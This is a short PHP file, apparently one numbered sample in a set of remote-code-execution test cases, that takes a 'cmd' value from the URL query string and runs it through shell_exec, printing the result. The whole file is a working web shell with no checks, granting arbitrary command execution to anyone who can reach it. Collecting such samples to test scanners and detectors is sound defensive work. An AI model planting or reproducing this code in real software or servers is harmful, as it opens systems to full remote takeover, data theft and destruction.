<?php
// RCE test variation #910
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>